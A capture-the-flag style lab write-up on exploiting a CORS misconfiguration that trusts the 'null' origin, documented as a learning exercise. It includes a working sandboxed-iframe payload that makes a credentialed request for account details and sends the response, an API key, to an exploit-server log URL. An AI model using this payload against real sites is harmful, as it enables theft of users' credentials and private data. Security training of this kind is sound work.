CORS vulnerability with trusted null origin

**Category**: CORS  
**Difficulty**: Apprentice

---

## Overview / What I Learned

- This lab demonstrates a misconfiguration where the server trusts requests from the "null" origin.
- I learned how sandboxed iframes generate a "null" origin and how CORS headers can be exploited if misconfigured to allow this.
- It's possible to exfiltrate sensitive data like API keys by sending authenticated CORS requests from a null origin.

---

## Exploit Steps / Attack Methodology

### 1. Recon and Initial Testing

- Logged into the lab using test credentials: `wiener:peter`.
- Clicked "My account" to see the user's API key was fetched via an AJAX request to `/accountDetails`.
- Intercepted the request and sent it to Burp Repeater.
- Added the header: `Origin: null`.
- Observed that the response included:
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true
Confirmed the server trusts the null origin and supports credentials.

### 2. Exploit Setup

- Accessed the provided Exploit Server.
- Crafted a payload using a sandboxed iframe to generate a null origin request with credentials.

### 3. Exploit Payload

```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="
<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('GET', 'https://labId.web-security-academy.net/accountDetails', true);
req.withCredentials = true;
req.send();
function reqListener() {
  location='https://Exploits-Server-Id.exploit-server.net/log?key=' + encodeURIComponent(this.responseText);
};
</script>
"></iframe>
Replaced Lab-Id and exploitID with valid values 

Saved and viewed the exploit. Verified it worked: the API key was leaked to the logs.

Clicked "Deliver exploit to victim".

After a few seconds, checked "Access log" on the Exploit Server.

Retrieved the administratorâ€™s API key from the logs.

Final Submission
Submitted the admin's API key to complete the lab successfully.

